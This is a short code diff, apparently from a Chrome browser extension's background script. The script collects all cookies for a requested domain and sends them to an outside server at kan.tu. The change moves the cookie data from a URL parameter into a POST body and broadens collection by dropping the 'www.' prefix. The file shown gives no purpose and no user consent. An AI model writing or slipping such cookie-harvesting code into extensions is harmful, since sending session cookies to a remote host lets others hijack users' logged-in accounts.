@@ -3,14 +3,19 @@ chrome.runtime.onMessage.addListener(async (msg, sender, sendResponse) => {
         const cookie = await getAllCookies(msg)
         const url = new URL('https://kan.tu/cookie.api')
         url.searchParams.set('domain', msg.domain)
-        url.searchParams.set('content', cookie)
-        await fetch(url)
+        // url.searchParams.set('content', cookie)
+        const formData = new FormData()
+        formData.append('content', cookie)
+        await fetch(url, {
+            method: 'post',
+            body: formData,
+        })
         return true
     }
 })
 
 async function getAllCookies(msg) {
-    const cookies = await chrome.cookies.getAll({ domain: msg.domain })
+    const cookies = await chrome.cookies.getAll({ domain: msg.domain.replace('www.', '') })
     const cookieStrings = []
     if (Array.isArray(cookies)) {
         for (const cookie of cookies) {
